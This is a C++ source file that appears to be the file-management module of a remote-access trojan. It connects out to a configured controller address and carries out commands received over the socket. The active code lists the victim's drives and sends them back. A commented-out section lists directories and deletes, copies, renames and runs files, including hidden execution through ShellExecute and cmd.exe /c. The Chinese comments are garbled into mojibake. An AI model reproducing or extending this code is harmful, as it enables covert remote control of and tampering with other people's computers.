#include "StdAfx.h"
#include "FileOperator.h"
#include <stdio.h>
#include <shellapi.h>
#include "ConnectInfo.h"
///////////////////////////////////////////////////////////////////////////////
//
//  ����Ӳ����Ϣ
//	GetLastError();//��������
//  GetTickCount();//��������
//	GetCurrentProcessId();//��������

//�����׽��������ض˽������� ������Ϣ
DWORD MainFileManage()
{
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);
	
	SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);//���½���һ��ר�ŵ�socket�Ϳͻ��˽��н���
	if(connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{
 
		closesocket(FileSocket);
		return 0;//connect error
	}
	
	//================================================================================
	MsgHead msgHead;
	char *chBuffer = new char[1536 * 1024]; //���ݽ����� 1.5MB
	
	//send socket type 
	msgHead.dwCmd = SOKCET_FILEMANAGE;
	msgHead.dwSize = 0;
	if(!SendMsg(FileSocket, chBuffer, &msgHead))
	{
 
		if(chBuffer != NULL)
			delete []chBuffer;
		
		closesocket(FileSocket);
		return 0;//send socket type error
	}

	while(1)
	{
		//��������
        if(!RecvMsg(FileSocket, chBuffer, &msgHead))
            break;
	 
		//��������
		switch(msgHead.dwCmd)
		{
		case CMD_FILEDRIVER://��ȡ������
			{
                    FileListDirver(chBuffer, &msgHead);
			}
			break;
		default:
			{
               
			} 
			break;

		}
        char str[111];
	//	if(msgHead.dwCmd == CMD_SUCCEED)//�Ҹ������ӵ�
		//	 msgHead.dwSize = 0;
		if(!SendMsg(FileSocket, chBuffer, &msgHead))//MSGHEAD Ϊ7
                break;
	}
     if(chBuffer != NULL)
		 delete[] chBuffer;
	 closesocket(FileSocket);
	return 0;
}

void FileListDirver(char *pBuf, LPMsgHead lpMsgHead)
{
	typedef DWORD  (WINAPI *pSHGetFileInfoA)(
		LPCSTR pszPath, 
		DWORD dwFileAttributes, 
		SHFILEINFOA *psfi, 
		UINT cbFileInfo,
		UINT uFlags);
	typedef UINT (WINAPI *pGetDriveTypeA)(
		LPCSTR lpRootPathName);

	pSHGetFileInfoA MySHGetFileInfoA = NULL;
	pGetDriveTypeA MyGetDriveTypeA = NULL;

	HINSTANCE hShell32 = LoadLibrary("Shell32.dll");
	if(hShell32 != NULL)
	{
		MySHGetFileInfoA = (pSHGetFileInfoA)GetProcAddress(hShell32, "SHGetFileInfoA");
	}	
	HINSTANCE hKernel32 = LoadLibrary("Kernel32.dll");
	if(hKernel32 != NULL)
	{
		MyGetDriveTypeA = (pGetDriveTypeA)GetProcAddress(hKernel32, "GetDriveTypeA");
	}	

	DriverInfo driver;
	DWORD dwLen = 0;
	SHFILEINFO sfi;
	
	for (char chDriver = 'B'; chDriver <= 'Z'; chDriver++)
	{
		memset(&driver,0,sizeof(DriverInfo));
		sprintf(driver.driver, "%C:\\",chDriver);
		driver.drivertype = MyGetDriveTypeA(driver.driver);
		if (driver.drivertype >= 2)//������������ʶ���򷵻�0����ָ����Ŀ¼�����ڣ��򷵻�1
		{
			if(MySHGetFileInfoA)
				MySHGetFileInfoA(driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
			//else
			//	SHGetFileInfo(driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
			strcpy(driver.display , sfi.szDisplayName);	
			
			//д�뻺����
			memcpy(pBuf+dwLen,&driver,sizeof(DriverInfo));
			dwLen += sizeof(DriverInfo);
		}
	}

	if (hShell32)
		FreeLibrary(hShell32);
	if (hKernel32)
		FreeLibrary(hKernel32);

	lpMsgHead->dwCmd  = CMD_SUCCEED;
	lpMsgHead->dwSize = dwLen;
}
 

 /*
//ö���ļ�·��
void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead)
{
	HANDLE hFile;
	WIN32_FIND_DATA WFD;

	SHFILEINFO shfi;
	SYSTEMTIME systime;
	FILETIME localtime;

	FileInfo m_FileInfo;
	DWORD dwLen = 0;

	//���ҵ�һ���ļ�
	pBuf[lpMsgHead->dwSize] = 0;
	if( ( hFile = FindFirstFile(pBuf,&WFD) ) == INVALID_HANDLE_VALUE)
	{   //�ļ��в��ɶ���Ŀ¼�޷�����
		 lpMsgHead->dwCmd  = CMD_DIRFLODERERR;
		lpMsgHead->dwSize = 0;
		return;
	}

	do
	{
	    //����������Ϣ
		memset(&shfi,0,sizeof(shfi));
		SHGetFileInfo(WFD.cFileName, 
			              FILE_ATTRIBUTE_NORMAL,
			              &shfi, sizeof(shfi),
			              SHGFI_ICON|SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME );
		if(strcmp(WFD.cFileName,".")==0
		 ||strcmp(WFD.cFileName,"..")==0)
			continue;//����Щ������
		//д���ļ���Ϣ�ṹ
		memset(&m_FileInfo, 0, sizeof(FileInfo));
	    strncpy(m_FileInfo.cFileName,WFD.cFileName,64);                              //�ļ���

        if(WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)                     
		{
			m_FileInfo.iType = 1;                                                    //Ŀ¼
			//strcpy(m_FileInfo.cAttrib, "�ļ���");                                  //�ļ�����
		}
        else
		{
			m_FileInfo.iType = 2;                                                    //�ļ�
			DWORD dwSize = WFD.nFileSizeHigh*MAXDWORD+WFD.nFileSizeLow;              //�ļ���С
			if(dwSize < 1024)//�����ʽ�����ַ�����ŵ��ɱ�ˣ�����KBǰ2���ո�
				sprintf(m_FileInfo.cSize,"%d Bytes", dwSize);
			else if (dwSize > 1024 && dwSize < 1024 * 1024)
				sprintf(m_FileInfo.cSize,"%4.2f  KB", (float)dwSize / 1024);
			else if(dwSize > 1024 * 1024 && dwSize < 1024 * 1024 * 1024)
				sprintf(m_FileInfo.cSize,"%4.2f MB", (float)dwSize / 1024 / 1024);
			else if(dwSize > 1024 * 1024 * 1024 && dwSize < 0xFFFFFFFF)
				sprintf(m_FileInfo.cSize,"%4.2f GB", (float)dwSize / 1024 / 1024 / 1024);
			else//������ɱ��ֻ����ô����
				sprintf(m_FileInfo.cSize,"Kill You");
			strcpy(m_FileInfo.cAttrib, shfi.szTypeName);                            //�ļ�����
		}
    
	    //ת������ʱ�䵽����ʱ��
	    FileTimeToLocalFileTime(&WFD.ftLastWriteTime,&localtime);
	    FileTimeToSystemTime(&localtime,&systime);
	    sprintf(m_FileInfo.cTime, "%4d-%02d-%02d %02d:%02d:%02d",
		systime.wYear,systime.wMonth,systime.wDay,systime.wHour,
		systime.wMinute,systime.wSecond);                                            //�ļ�ʱ��

		//д�뻺����
		memcpy(pBuf+dwLen,&m_FileInfo,sizeof(FileInfo));
		dwLen += sizeof(FileInfo);

		if(GetLastError()==ERROR_NO_MORE_FILES)
			break;
	}while(FindNextFile(hFile,&WFD));

	FindClose(hFile);

	lpMsgHead->dwCmd  = CMD_SUCCEED;
	lpMsgHead->dwSize = dwLen;
}

 
void FileDelete(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt,pBuf,sizeof(m_FileOpt));

	if(DeleteFile(m_FileOpt.cScrFile))
		lpMsgHead->dwCmd  = CMD_SUCCEED;
	else
		lpMsgHead->dwCmd  = CMD_FAILED;
	lpMsgHead->dwSize = 0;
}

void FileExec(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));

	if (m_FileOpt.iSize < 0)//��������
	{
		HINSTANCE hInst = ::ShellExecute(NULL, "open",m_FileOpt.cScrFile, NULL,NULL, SW_HIDE);
		if ((INT)hInst < 32)//������ֵС��32���ִ���
			lpMsgHead->dwCmd  = CMD_FAILED;
		else
			lpMsgHead->dwCmd  = CMD_SUCCEED;
		lpMsgHead->dwSize = 0;	
	}
	else
	{
		char szCmd[512] = {0};
		wsprintf(szCmd, "cmd.exe /c \"%s\"", m_FileOpt.cScrFile);
		PROCESS_INFORMATION ProcessInfo; 
		STARTUPINFOA StartupInfo; //This is an [in] parameter
		ZeroMemory(&StartupInfo, sizeof(StartupInfo));
		StartupInfo.cb          = sizeof(StartupInfo); //Only compulsory field
		StartupInfo.lpDesktop   = "WinSta0\\Default";
		StartupInfo.dwFlags     = STARTF_USESHOWWINDOW; 
		StartupInfo.wShowWindow = SW_SHOW;

		if(CreateProcess(NULL, szCmd, 
			NULL,NULL,FALSE,0,NULL,
			"c:\\",&StartupInfo,&ProcessInfo))
		{
			CloseHandle(ProcessInfo.hThread);
			CloseHandle(ProcessInfo.hProcess);

			lpMsgHead->dwCmd  = CMD_SUCCEED;
		}
		else
			lpMsgHead->dwCmd  = CMD_FAILED;
		lpMsgHead->dwSize = 0;	
	}
}

void FilePaste(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt,pBuf,sizeof(m_FileOpt));

	if(CopyFile(m_FileOpt.cScrFile,m_FileOpt.cDstFile,TRUE))
		lpMsgHead->dwCmd  = CMD_SUCCEED;
	else
		lpMsgHead->dwCmd  = CMD_FAILED;
	lpMsgHead->dwSize = 0;
}

void FileReName(char *pBuf, LPMsgHead lpMsgHead)
{
	FileOpt m_FileOpt;
	memcpy(&m_FileOpt,pBuf,sizeof(m_FileOpt));

	if(MoveFile(m_FileOpt.cScrFile,m_FileOpt.cDstFile))
		lpMsgHead->dwCmd  = CMD_SUCCEED;
	else
		lpMsgHead->dwCmd  = CMD_FAILED;
	lpMsgHead->dwSize = 0;
}
 
 */